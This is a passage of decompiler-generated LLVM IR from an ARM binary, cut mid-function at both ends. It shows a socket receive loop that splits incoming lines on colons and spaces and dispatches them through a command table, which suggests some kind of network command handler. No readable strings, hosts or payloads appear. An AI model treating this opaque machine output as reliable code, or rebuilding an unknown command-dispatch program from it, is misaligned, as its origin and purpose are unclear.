  %v0_c3a4 = call i32 @function_cd58()
  %v0_c3ac = load i32, i32* @r4, align 4
  %v2_c3ac = add i32 %v0_c3ac, %v0_c3a4
  %v1_c3b4 = call i32 @function_10508(i32 %v2_c3ac)
  %v0_c3b8 = call i32 @function_8688()
  store i32 %v0_c3b8, i32* @global_var_1abf4.187, align 4
  %v0_c3c8 = call i32 @function_8688()
  store i32 %v0_c3c8, i32* @global_var_1abf0.41, align 4
  %v0_c3d8 = call i32 @function_8688()
  store i32 %v0_c3d8, i32* @global_var_1abfc.253, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_15ee4.256 to i32), i32* @global_var_1ad08.185, align 4
  store i32 ptrtoint (i32* @global_var_15ee8.259 to i32), i32* @global_var_1ad04.211, align 4
  store i32 0, i32* @global_var_1ad00.142, align 4
  %v2_c450 = ptrtoint i32* %stack_var_-596 to i32
  %v2_c510 = ptrtoint i32* %stack_var_-340 to i32
  %v2_c72c = ptrtoint i32* %stack_var_-6740 to i32
  %v2_c768 = add i32 %v16_c098, -6720
  %v2_c81c = ptrtoint i32* %stack_var_-2644 to i32
  %v2_c8c8 = ptrtoint i32* %stack_var_-1620 to i32
  %v3_c994 = bitcast i32* %stack_var_-1620 to i8*
  br label %dec_label_pc_c410

dec_label_pc_c410:                                ; preds = %dec_label_pc_c720, %dec_label_pc_c48c, %dec_label_pc_c988, %dec_label_pc_c38c
  %v0_c410 = call i32 @function_bd88()
  %v2_c418 = load i32, i32* @global_var_1abf8.25, align 4
  %v2_c420 = load i32, i32* @global_var_1abf4.187, align 4
  %v2_c428 = load i32, i32* @global_var_1abf0.41, align 4
  store i32 %v2_c428, i32* @lr, align 4
  store i32 %v2_c420, i32* @r2, align 4
  %v3_c448 = call i32 @function_8374(i32 %v2_c418, i32 ptrtoint ([41 x i8]* @global_var_15eec.263 to i32))
  br label %dec_label_pc_c464.lr.ph

dec_label_pc_c464.lr.ph:                          ; preds = %dec_label_pc_c6d8, %dec_label_pc_c758, %dec_label_pc_c9a4, %dec_label_pc_c9c4, %dec_label_pc_c410
  br label %dec_label_pc_c464

dec_label_pc_c464:                                ; preds = %dec_label_pc_c464.lr.ph, %dec_label_pc_c464
  %storemerge1226 = phi i32 [ 0, %dec_label_pc_c464.lr.ph ], [ %v1_c478, %dec_label_pc_c464 ]
  %v5_c470 = mul nuw nsw i32 %storemerge1226, 4
  %v6_c470 = add i32 %v5_c470, %v2_c450
  %v7_c470 = inttoptr i32 %v6_c470 to i32*
  store i32 0, i32* %v7_c470, align 4
  %v1_c478 = add nuw nsw i32 %storemerge1226, 1
  %tmp66 = icmp ult i32 %v1_c478, 32
  br i1 %tmp66, label %dec_label_pc_c464, label %dec_label_pc_c48c

dec_label_pc_c48c:                                ; preds = %dec_label_pc_c464
  %v2_c490 = load i32, i32* @global_var_1abf8.25, align 4
  %v3_c494 = udiv i32 %v2_c490, 32
  %v3_c4a8 = mul nuw nsw i32 %v3_c494, 4
  %v2_c4b0 = add i32 %v3_c4a8, %v16_c098
  %v2_c4b4 = add i32 %v2_c4b0, -576
  %v1_c4b8 = inttoptr i32 %v2_c4b4 to i32*
  %v2_c4b8 = load i32, i32* %v1_c4b8, align 4
  %v1_c4c4 = urem i32 %v2_c490, 32
  %v6_c4cc = shl i32 1, %v1_c4c4
  %v2_c4d0 = or i32 %v2_c4b8, %v6_c4cc
  store i32 %v2_c4d0, i32* %v1_c4b8, align 4
  store i32 1200, i32* %stack_var_-340, align 4
  %v2_c504 = load i32, i32* @global_var_1abf8.25, align 4
  %v1_c508 = add i32 %v2_c504, 1
  %v5_c524 = call i32 @function_ce00(i32 %v1_c508, i32 %v2_c450, i32 0, i32 0, i32 %v2_c510)
  %tmp67 = icmp slt i32 %v5_c524, 1
  br i1 %tmp67, label %dec_label_pc_c410, label %dec_label_pc_c6c4.preheader

dec_label_pc_c6c4.preheader:                      ; preds = %dec_label_pc_c48c
  %v2_c6c897 = load i32, i32* @global_var_18480.29, align 4
  %v3_c6d099 = icmp eq i32 %v2_c6c897, 0
  br i1 %v3_c6d099, label %dec_label_pc_c6d8, label %dec_label_pc_c540

dec_label_pc_c540:                                ; preds = %dec_label_pc_c6b8, %dec_label_pc_c6c4.preheader
  %storemerge13106 = phi i32 [ %.pre124, %dec_label_pc_c6b8 ], [ 0, %dec_label_pc_c6c4.preheader ]
  %v3_c544 = mul i32 %storemerge13106, 4
  %v2_c550 = load i32, i32* @global_var_1ad0c.31, align 4
  %v2_c554 = add i32 %v2_c550, %v3_c544
  %v1_c558 = inttoptr i32 %v2_c554 to i32*
  %v2_c558 = load i32, i32* %v1_c558, align 4
  store i32 %v2_c558, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v3_c568 = call i32 @function_ce5c(i32 %v2_c558, i32 0, i32 1)
  %tmp68 = icmp slt i32 %v3_c568, 1
  %.pre124 = add i32 %storemerge13106, 1
  br i1 %tmp68, label %dec_label_pc_c6b8, label %dec_label_pc_c5d0.preheader

dec_label_pc_c5d0.preheader:                      ; preds = %dec_label_pc_c540
  %v2_c5d476 = load i32, i32* @global_var_18480.29, align 4
  %v3_c5dc78 = icmp ult i32 %.pre124, %v2_c5d476
  %v3_c5e879 = mul i32 %.pre124, 4
  %v2_c5f480 = load i32, i32* @global_var_1ad0c.31, align 4
  %v2_c5f881 = add i32 %v2_c5f480, %v3_c5e879
  %v1_c5fc82 = add i32 %v2_c5f881, -4
  br i1 %v3_c5dc78, label %dec_label_pc_c588, label %dec_label_pc_c5e4

dec_label_pc_c588:                                ; preds = %dec_label_pc_c5d0.preheader, %dec_label_pc_c588
  %v1_c5fc86 = phi i32 [ %v1_c5fc, %dec_label_pc_c588 ], [ %v1_c5fc82, %dec_label_pc_c5d0.preheader ]
  %v2_c5f885 = phi i32 [ %v2_c5f8, %dec_label_pc_c588 ], [ %v2_c5f881, %dec_label_pc_c5d0.preheader ]
  %v1_c57c83 = phi i32 [ %v1_c57c, %dec_label_pc_c588 ], [ %.pre124, %dec_label_pc_c5d0.preheader ]
  %v1_c5bc = inttoptr i32 %v2_c5f885 to i32*
  %v2_c5bc = load i32, i32* %v1_c5bc, align 4
  %v2_c5c0 = inttoptr i32 %v1_c5fc86 to i32*
  store i32 %v2_c5bc, i32* %v2_c5c0, align 4
  %v1_c57c = add i32 %v1_c57c83, 1
  %v2_c5d4 = load i32, i32* @global_var_18480.29, align 4
  %v3_c5dc = icmp ult i32 %v1_c57c, %v2_c5d4
  %v3_c5e8 = mul i32 %v1_c57c, 4
  %v2_c5f4 = load i32, i32* @global_var_1ad0c.31, align 4
  %v2_c5f8 = add i32 %v2_c5f4, %v3_c5e8
  %v1_c5fc = add i32 %v2_c5f8, -4
  br i1 %v3_c5dc, label %dec_label_pc_c588, label %dec_label_pc_c5d0.dec_label_pc_c5e4_crit_edge

dec_label_pc_c5d0.dec_label_pc_c5e4_crit_edge:    ; preds = %dec_label_pc_c588
  br label %dec_label_pc_c5e4

dec_label_pc_c5e4:                                ; preds = %dec_label_pc_c5d0.dec_label_pc_c5e4_crit_edge, %dec_label_pc_c5d0.preheader
  %v1_c5fc.lcssa = phi i32 [ %v1_c5fc, %dec_label_pc_c5d0.dec_label_pc_c5e4_crit_edge ], [ %v1_c5fc82, %dec_label_pc_c5d0.preheader ]
  %v2_c604 = inttoptr i32 %v1_c5fc.lcssa to i32*
  store i32 0, i32* %v2_c604, align 4
  %v2_c60c = load i32, i32* @global_var_18480.29, align 4
  %v1_c610 = add i32 %v2_c60c, -1
  store i32 %v1_c610, i32* @global_var_18480.29, align 4
  %v3_c624 = mul i32 %v1_c610, 4
  %v1_c628 = add i32 %v3_c624, 4
  %v1_c630 = call i32 @function_fc78(i32 %v1_c628)
  %v2_c68c90 = load i32, i32* @global_var_18480.29, align 4
  %v3_c69492 = icmp eq i32 %v2_c68c90, 0
  br i1 %v3_c69492, label %dec_label_pc_c69c, label %dec_label_pc_c648

dec_label_pc_c648:                                ; preds = %dec_label_pc_c5e4, %dec_label_pc_c648
  %storemerge1593 = phi i32 [ %v1_c680, %dec_label_pc_c648 ], [ 0, %dec_label_pc_c5e4 ]
  %v3_c64c = mul i32 %storemerge1593, 4
  %v2_c658 = add i32 %v3_c64c, %v1_c630
  %v2_c66c = load i32, i32* @global_var_1ad0c.31, align 4
  %v2_c670 = add i32 %v2_c66c, %v3_c64c
  %v1_c674 = inttoptr i32 %v2_c670 to i32*
  %v2_c674 = load i32, i32* %v1_c674, align 4
  %v2_c678 = inttoptr i32 %v2_c658 to i32*
  store i32 %v2_c674, i32* %v2_c678, align 4
  %v1_c680 = add i32 %storemerge1593, 1
  %v2_c68c = load i32, i32* @global_var_18480.29, align 4
  %v3_c694 = icmp ult i32 %v1_c680, %v2_c68c
  br i1 %v3_c694, label %dec_label_pc_c648, label %dec_label_pc_c688.dec_label_pc_c69c_crit_edge

dec_label_pc_c688.dec_label_pc_c69c_crit_edge:    ; preds = %dec_label_pc_c648
  br label %dec_label_pc_c69c

dec_label_pc_c69c:                                ; preds = %dec_label_pc_c5e4, %dec_label_pc_c688.dec_label_pc_c69c_crit_edge
  %v2_c6a0 = load i32, i32* @global_var_1ad0c.31, align 4
  store i32 %v2_c6a0, i32* @r0, align 4
  %v0_c6a8 = call i32 @function_fdcc()
  store i32 %v1_c630, i32* @global_var_1ad0c.31, align 4
  br label %dec_label_pc_c6b8

dec_label_pc_c6b8:                                ; preds = %dec_label_pc_c540, %dec_label_pc_c69c
  %v2_c6c8 = load i32, i32* @global_var_18480.29, align 4
  %v3_c6d0 = icmp ult i32 %.pre124, %v2_c6c8
  br i1 %v3_c6d0, label %dec_label_pc_c540, label %dec_label_pc_c6d8

dec_label_pc_c6d8:                                ; preds = %dec_label_pc_c6b8, %dec_label_pc_c6c4.preheader
  %v2_c6dc = load i32, i32* @global_var_1abf8.25, align 4
  %v3_c6e0 = udiv i32 %v2_c6dc, 32
  %v3_c6ec = mul nuw nsw i32 %v3_c6e0, 4
  %v2_c6f4 = add i32 %v3_c6ec, %v16_c098
  %v2_c6f8 = add i32 %v2_c6f4, -576
  %v1_c6fc = inttoptr i32 %v2_c6f8 to i32*
  %v2_c6fc = load i32, i32* %v1_c6fc, align 4
  %v1_c708 = urem i32 %v2_c6dc, 32
  %v6_c70c2 = lshr i32 %v2_c6fc, %v1_c708
  %v1_c714 = urem i32 %v6_c70c2, 2
  %v2_c718 = icmp eq i32 %v1_c714, 0
  br i1 %v2_c718, label %dec_label_pc_c464.lr.ph, label %dec_label_pc_c720

dec_label_pc_c720:                                ; preds = %dec_label_pc_c6d8
  %v5_c740 = call i32 @function_fbbc(i32 %v2_c6dc, i32* nonnull %stack_var_-6740, i32 4096, i32 0)
  %tmp69 = icmp slt i32 %v5_c740, 1
  br i1 %tmp69, label %dec_label_pc_c410, label %dec_label_pc_c758

dec_label_pc_c758:                                ; preds = %dec_label_pc_c720
  %v2_c76c = add i32 %v2_c768, %v5_c740
  %v3_c76c = inttoptr i32 %v2_c76c to i8*
  store i8 0, i8* %v3_c76c, align 1
  store i32 %v2_c72c, i32* @r0, align 4
  %v6_c788 = call i32 @function_f510(i32 %v2_c72c, i32 ptrtoint (i32* @global_var_15f18.267 to i32), i32 %v2_c76c, i32 %v2_c72c, i32 %v5_c740)
  %v2_c9bc29 = icmp eq i32 %v6_c788, 0
  br i1 %v2_c9bc29, label %dec_label_pc_c464.lr.ph, label %dec_label_pc_c9c4

dec_label_pc_c798:                                ; preds = %dec_label_pc_c9c4
  %v2_c79c = call i32 @function_85f8(i32 %storemerge31.in)
  %v2_c7a4 = load i8, i8* %storemerge31, align 1
  %v7_c7a8 = icmp eq i8 %v2_c7a4, 58
  br i1 %v7_c7a8, label %dec_label_pc_c7c8, label %dec_label_pc_c850

dec_label_pc_c7bc:                                ; preds = %dec_label_pc_c7e0
  %v1_c7c0 = add i32 %storemerge20, 1
  br label %dec_label_pc_c7c8

dec_label_pc_c7c8:                                ; preds = %dec_label_pc_c798, %dec_label_pc_c7bc
  %storemerge20 = phi i32 [ %v1_c7c0, %dec_label_pc_c7bc ], [ 0, %dec_label_pc_c798 ]
  store i32 %storemerge31.in, i32* @r0, align 4
  %v0_c7d0 = call i32 @function_f030()
  %v3_c7d8 = icmp ult i32 %storemerge20, %v0_c7d0
  br i1 %v3_c7d8, label %dec_label_pc_c7e0, label %dec_label_pc_c7c8.dec_label_pc_c7fc_crit_edge

dec_label_pc_c7c8.dec_label_pc_c7fc_crit_edge:    ; preds = %dec_label_pc_c7c8
  %.pre = add i32 %storemerge20, %storemerge31.in
  %.pre32 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_c7fc

dec_label_pc_c7e0:                                ; preds = %dec_label_pc_c7c8
  %v2_c7ec = add i32 %storemerge20, %storemerge31.in
  %v1_c7f0 = inttoptr i32 %v2_c7ec to i8*
  %v2_c7f0 = load i8, i8* %v1_c7f0, align 1
  %v7_c7f4 = icmp eq i8 %v2_c7f0, 32
  br i1 %v7_c7f4, label %dec_label_pc_c7fc, label %dec_label_pc_c7bc

dec_label_pc_c7fc:                                ; preds = %dec_label_pc_c7e0, %dec_label_pc_c7c8.dec_label_pc_c7fc_crit_edge
  %v3_c810.pre-phi = phi i8* [ %.pre32, %dec_label_pc_c7c8.dec_label_pc_c7fc_crit_edge ], [ %v1_c7f0, %dec_label_pc_c7e0 ]
  %v2_c808.pre-phi = phi i32 [ %.pre, %dec_label_pc_c7c8.dec_label_pc_c7fc_crit_edge ], [ %v2_c7ec, %dec_label_pc_c7e0 ]
  store i8 0, i8* %v3_c810.pre-phi, align 1
  %v1_c818 = add i32 %storemerge31.in, 1
  %v2_c828 = inttoptr i32 %v1_c818 to i8*
  %v3_c828 = call i32 @function_f090(i32 %v2_c81c, i8* %v2_c828)
  %v1_c83c = add i32 %v2_c808.pre-phi, 1
  %v3_c848 = inttoptr i32 %v1_c83c to i8*
  %v4_c848 = call i32 @function_f090(i32 %storemerge31.in, i8* %v3_c848)
  br label %dec_label_pc_c87c

dec_label_pc_c850:                                ; preds = %dec_label_pc_c798
  store i32 42, i32* %stack_var_-2644, align 4
  br label %dec_label_pc_c87c

dec_label_pc_c870:                                ; preds = %dec_label_pc_c894
  %v1_c874 = add i32 %storemerge17, 1
  br label %dec_label_pc_c87c

dec_label_pc_c87c:                                ; preds = %dec_label_pc_c850, %dec_label_pc_c7fc, %dec_label_pc_c870
  %storemerge17 = phi i32 [ %v1_c874, %dec_label_pc_c870 ], [ 0, %dec_label_pc_c7fc ], [ 0, %dec_label_pc_c850 ]
  store i32 %storemerge17, i32* @r4, align 4
  store i32 %storemerge31.in, i32* @r0, align 4
  %v0_c884 = call i32 @function_f030()
  %v0_c88c = load i32, i32* @r4, align 4
  %v3_c88c = icmp ult i32 %v0_c88c, %v0_c884
  br i1 %v3_c88c, label %dec_label_pc_c894, label %dec_label_pc_c87c.dec_label_pc_c8b0_crit_edge

dec_label_pc_c87c.dec_label_pc_c8b0_crit_edge:    ; preds = %dec_label_pc_c87c
  %.pre33 = add i32 %storemerge17, %storemerge31.in
  %.pre34 = inttoptr i32 %.pre33 to i8*
  br label %dec_label_pc_c8b0

dec_label_pc_c894:                                ; preds = %dec_label_pc_c87c
  %v2_c8a0 = add i32 %storemerge17, %storemerge31.in
  %v1_c8a4 = inttoptr i32 %v2_c8a0 to i8*
  %v2_c8a4 = load i8, i8* %v1_c8a4, align 1
  %v7_c8a8 = icmp eq i8 %v2_c8a4, 32
  br i1 %v7_c8a8, label %dec_label_pc_c8b0, label %dec_label_pc_c870

dec_label_pc_c8b0:                                ; preds = %dec_label_pc_c894, %dec_label_pc_c87c.dec_label_pc_c8b0_crit_edge
  %v3_c8c4.pre-phi = phi i8* [ %.pre34, %dec_label_pc_c87c.dec_label_pc_c8b0_crit_edge ], [ %v1_c8a4, %dec_label_pc_c894 ]
  %v2_c8bc.pre-phi = phi i32 [ %.pre33, %dec_label_pc_c87c.dec_label_pc_c8b0_crit_edge ], [ %v2_c8a0, %dec_label_pc_c894 ]
  store i8 0, i8* %v3_c8c4.pre-phi, align 1
  %v4_c8d4 = call i32 @function_f090(i32 %v2_c8c8, i8* %storemerge31)
  %v1_c8e8 = add i32 %v2_c8bc.pre-phi, 1
  %v3_c8f4 = inttoptr i32 %v1_c8e8 to i8*
  %v4_c8f4 = call i32 @function_f090(i32 %storemerge31.in, i8* %v3_c8f4)
  %v8_c97c107 = load i32, i32* bitcast ([4 x i8]** @global_var_180b0.270 to i32*), align 4
  %v2_c980109 = icmp eq i32 %v8_c97c107, 0
  br i1 %v2_c980109, label %dec_label_pc_c988, label %dec_label_pc_c904

dec_label_pc_c904:                                ; preds = %dec_label_pc_c8b0, %dec_label_pc_c904
  %v7_c97c112 = phi i32* [ %v7_c97c, %dec_label_pc_c904 ], [ bitcast ([4 x i8]** @global_var_180b0.270 to i32*), %dec_label_pc_c8b0 ]
  %storemerge18110 = phi i32 [ %v1_c96c, %dec_label_pc_c904 ], [ 0, %dec_label_pc_c8b0 ]
  %v7_c90c = load i32, i32* %v7_c97c112, align 4
  %v2_c91c = inttoptr i32 %v7_c90c to i8*
  %v3_c91c = call i32 @function_f464(i8* %v2_c91c, i32 %v2_c8c8)
  %v3_c938 = mul i32 %storemerge18110, 8
  %v2_c940 = add i32 %v3_c938, add (i32 ptrtoint ([4 x i8]** @global_var_180b0.270 to i32), i32 4)
  %v1_c944 = inttoptr i32 %v2_c940 to i32*
  %v2_c944 = load i32, i32* %v1_c944, align 4
  store i32 %v2_c944, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v2_c944)
  %v1_c96c = add i32 %storemerge18110, 1
  %v5_c97c = mul i32 %v1_c96c, 8
  %v6_c97c = add i32 %v5_c97c, ptrtoint ([4 x i8]** @global_var_180b0.270 to i32)
  %v7_c97c = inttoptr i32 %v6_c97c to i32*
  %v8_c97c = load i32, i32* %v7_c97c, align 4
  %v2_c980 = icmp eq i32 %v8_c97c, 0
  br i1 %v2_c980, label %dec_label_pc_c988, label %dec_label_pc_c904

dec_label_pc_c988:                                ; preds = %dec_label_pc_c904, %dec_label_pc_c8b0
  %v4_c994 = call i32 @function_f464(i8* %v3_c994, i32 ptrtoint ([6 x i8]* @global_var_15f1c.272 to i32))
  %v2_c99c = icmp eq i32 %v4_c994, 0
  br i1 %v2_c99c, label %dec_label_pc_c410, label %dec_label_pc_c9a4

dec_label_pc_c9a4:                                ; preds = %dec_label_pc_c988
  store i32 0, i32* @r0, align 4
  %v6_c9ac = call i32 @function_f510(i32 0, i32 ptrtoint (i32* @global_var_15f18.267 to i32), i32 ptrtoint ([4 x i8]** @global_var_180b0.270 to i32), i32 %v4_c994, i32 ptrtoint (i32* @0 to i32))
  %v2_c9bc = icmp eq i32 %v6_c9ac, 0
  br i1 %v2_c9bc, label %dec_label_pc_c464.lr.ph, label %dec_label_pc_c9c4

dec_label_pc_c9c4:                                ; preds = %dec_label_pc_c758, %dec_label_pc_c9a4
  %storemerge31.in = phi i32 [ %v6_c9ac, %dec_label_pc_c9a4 ], [ %v6_c788, %dec_label_pc_c758 ]
  %storemerge31 = inttoptr i32 %storemerge31.in to i8*
  %v2_c9c8 = load i8, i8* %storemerge31, align 1
  %v2_c9cc = icmp eq i8 %v2_c9c8, 0
  br i1 %v2_c9cc, label %dec_label_pc_c464.lr.ph, label %dec_label_pc_c798

; uselistorder directives
  uselistorder i8* %storemerge31, { 2, 1, 0 }
  uselistorder i32 %storemerge31.in, { 10, 9, 6, 3, 2, 5, 4, 8, 1, 0, 7 }
  uselistorder i32* %v7_c97c, { 1, 0 }
  uselistorder i32 %v1_c96c, { 1, 0 }
  uselistorder i32 %storemerge18110, { 1, 0 }
  uselistorder i32 %.pre33, { 1, 0 }
  uselistorder i32 %storemerge17, { 1, 0, 3, 2 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge20, { 2, 1, 0, 3 }
  uselistorder i32 %v5_c740, { 1, 0, 2 }
  uselistorder i32 %v2_c6dc, { 2, 1, 0 }
  uselistorder i32 %v1_c680, { 1, 0 }
  uselistorder i32 %v3_c64c, { 1, 0 }
  uselistorder i32 %storemerge1593, { 1, 0 }
  uselistorder i32 %v1_c630, { 1, 0 }
  uselistorder i32 %v1_c5fc, { 1, 0 }
  uselistorder i32 %v2_c5f8, { 1, 0 }
  uselistorder i32 %v1_c57c, { 0, 2, 1 }
  uselistorder i32 %v1_c5fc82, { 1, 0 }
  uselistorder i32 %.pre124, { 1, 4, 0, 3, 2 }
  uselistorder i32 %storemerge13106, { 1, 0 }
  uselistorder i32 %v2_c490, { 1, 0 }
  uselistorder i32 %storemerge1226, { 1, 0 }
  uselistorder i32 %v2_c72c, { 0, 2, 1 }
  uselistorder i32 %v2_c450, { 1, 0 }
  uselistorder i32 %storemerge11, { 2, 0, 1 }
  uselistorder i32 %v3_c250, { 1, 0, 2 }
  uselistorder i32 %v2_c1c4, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-64.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1620, { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([4 x i8]** @global_var_180b0.270 to i32), { 1, 2, 0 }
  uselistorder [4 x i8]** @global_var_180b0.270, { 1, 0 }
  uselistorder i32 (i32)* @function_85f8, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_f510, { 1, 0 }
  uselistorder i32* @global_var_1ad0c.31, { 1, 3, 4, 5, 0, 6, 2, 7, 8 }
  uselistorder i32* @global_var_18480.29, { 6, 7, 1, 4, 8, 9, 2, 0, 10, 3, 5, 11 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_ce00, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_8374, { 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 6, 5, 4, 3, 2, 1, 0, 15, 14, 13, 12, 11, 10, 9, 7, 8 }
  uselistorder i32* @global_var_1abf8.25, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 1, 13, 14 }
  uselistorder i32* @global_var_1ad00.142, { 0, 1, 4, 2, 5, 6, 7, 3 }
  uselistorder i32* @global_var_1abf0.41, { 1, 0 }
  uselistorder i32* @global_var_1abf4.187, { 3, 0, 1, 4, 5, 2, 6, 7, 8, 9 }
  uselistorder i32 ()* @function_8688, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_10508, { 1, 0 }
  uselistorder i32 ()* @function_cc10, { 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_15070.39 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder label %dec_label_pc_c9c4, { 1, 0 }
  uselistorder label %dec_label_pc_c904, { 1, 0 }
  uselistorder label %dec_label_pc_c87c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c7c8, { 1, 0 }
  uselistorder label %dec_label_pc_c6b8, { 1, 0 }
  uselistorder label %dec_label_pc_c69c, { 1, 0 }
  uselistorder label %dec_label_pc_c648, { 1, 0 }
  uselistorder label %dec_label_pc_c588, { 1, 0 }
  uselistorder label %dec_label_pc_c464, { 1, 0 }
  uselistorder label %dec_label_pc_c464.lr.ph, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_c410, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_c370, { 1, 0 }
  uselistorder label %dec_label_pc_c2b0, { 1, 0 }
  uselistorder label %dec_label_pc_c298, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_c180, { 1, 0 }
  uselistorder label %dec_label_pc_c10c, { 1, 0 }
}

define i32 @function_ca30(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ca30:
  store i32 %arg1, i32* @r0, align 4
  %v1_ca30 = add i32 %arg2, -1
  %v2_ca30 = icmp eq i32 %arg2, 0
  br i1 %v2_ca30, label %dec_label_pc_caec, label %dec_label_pc_ca38

dec_label_pc_ca38:                                ; preds = %dec_label_pc_ca30
  %v7_ca30 = icmp eq i32 %arg2, 1
  br i1 %v7_ca30, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_ca38
  %v1_ca38 = load i32, i32* @r0, align 4
  %v10_ca38 = icmp eq i32 %v1_ca38, %arg2
  br i1 %v10_ca38, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_ca38, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_ca38 = icmp ult i32 %v1_ca38, %arg2
  br i1 %v4_ca38, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_ca40 = and i32 %v1_ca30, %arg2
  %v8_ca40 = icmp eq i32 %v6_ca40, 0
  br i1 %v8_ca40, label %.thread67, label %dec_label_pc_ca50.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_ca44 = phi i32 [ %v1_ca38, %bb75 ], [ 0, %.thread65 ]
  %v3_ca44 = and i32 %v1_ca44, %v1_ca30
  br label %bb76

dec_label_pc_ca50.preheader:                      ; preds = %bb75
  %v2_ca5099 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_ca5099, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_cae0, %bb74, %bb89, %bb84, %dec_label_pc_cab0, %.thread67
  %v5_ca48 = phi i32 [ %v1_ca38, %bb74 ], [ %v3_ca44, %.thread67 ], [ %v1_ca8c.v6_ca8c.v6_ca94.v6_ca9c, %dec_label_pc_cab0 ], [ 0, %bb84 ], [ %v1_cae4, %dec_label_pc_cae0 ], [ %v2_cae0, %bb89 ]
  ret i32 %v5_ca48

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_ca50.preheader
  %v0_ca64.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_ca50.preheader ], [ %v4_ca58, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_ca50.preheader ], [ %v2_ca5c11, %.thread1.thread9 ]
  br label %dec_label_pc_ca64thread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_ca50.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_ca5c11, %.thread1.thread9 ], [ 0, %dec_label_pc_ca50.preheader ]
  %v0_ca64.pr33100 = phi i32 [ %v4_ca58, %.thread1.thread9 ], [ %arg2, %dec_label_pc_ca50.preheader ]
  %v4_ca54 = icmp ult i32 %v0_ca64.pr33100, %v1_ca38
  br i1 %v4_ca54, label %bb78, label %dec_label_pc_ca64thread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_ca58 = and i32 %v0_ca64.pr33100, 268435456
  %v3_ca58 = icmp eq i32 %v2_ca58, 0
  %v4_ca58 = mul i32 %v0_ca64.pr33100, 16
  br i1 %v3_ca58, label %.thread1.thread9, label %dec_label_pc_ca64.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_ca5c11 = add i32 %storemerge101, 4
  %v2_ca50 = icmp ugt i32 %v4_ca58, 268435455
  br i1 %v2_ca50, label %.thread, label %bb77

dec_label_pc_ca64thread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_ca64thread-pre-split.loopexit

dec_label_pc_ca64thread-pre-split.loopexit:       ; preds = %dec_label_pc_ca64thread-pre-split.loopexit.loopexit, %.thread
  %v0_ca64.pr3398 = phi i32 [ %v0_ca64.pr33.lcssa, %.thread ], [ %v0_ca64.pr33100, %dec_label_pc_ca64thread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_ca64thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_ca64thread-pre-split

dec_label_pc_ca64thread-pre-split:                ; preds = %.thread4, %dec_label_pc_ca64thread-pre-split.loopexit
  %v1_ca7039 = phi i32 [ %storemerge95, %dec_label_pc_ca64thread-pre-split.loopexit ], [ %v2_ca70, %.thread4 ]
  %v0_ca64.pr = phi i32 [ %v0_ca64.pr3398, %dec_label_pc_ca64thread-pre-split.loopexit ], [ %v3_ca6c, %.thread4 ]
  br label %dec_label_pc_ca64

dec_label_pc_ca64.loopexit:                       ; preds = %bb78
  br label %dec_label_pc_ca64

dec_label_pc_ca64:                                ; preds = %dec_label_pc_ca64.loopexit, %dec_label_pc_ca64thread-pre-split
  %v0_ca78.pr = phi i32 [ %v1_ca7039, %dec_label_pc_ca64thread-pre-split ], [ %storemerge101, %dec_label_pc_ca64.loopexit ]
  %v1_ca6c = phi i32 [ %v0_ca64.pr, %dec_label_pc_ca64thread-pre-split ], [ %v4_ca58, %dec_label_pc_ca64.loopexit ]
  %v2_ca64 = icmp slt i32 %v1_ca6c, 0
  br i1 %v2_ca64, label %dec_label_pc_ca78, label %bb79

bb79:                                             ; preds = %dec_label_pc_ca64
  %v4_ca68 = icmp ult i32 %v1_ca6c, %v1_ca38
  br i1 %v4_ca68, label %.thread4, label %dec_label_pc_ca78

.thread4:                                         ; preds = %bb79
  %v3_ca6c = mul i32 %v1_ca6c, 2
  %v2_ca70 = add i32 %v0_ca78.pr, 1
  br label %dec_label_pc_ca64thread-pre-split

dec_label_pc_ca78:                                ; preds = %bb79, %dec_label_pc_ca64
  %v2_ca78 = add i32 %v0_ca78.pr, -3
  %v5_ca7c = icmp slt i32 %v0_ca78.pr, 3
  br i1 %v5_ca7c, label %dec_label_pc_cabc, label %dec_label_pc_ca80

dec_label_pc_ca80:                                ; preds = %dec_label_pc_ca78, %bb83
  %v6_caa8 = phi i32 [ %v0_cab0, %bb83 ], [ %v2_ca78, %dec_label_pc_ca78 ]
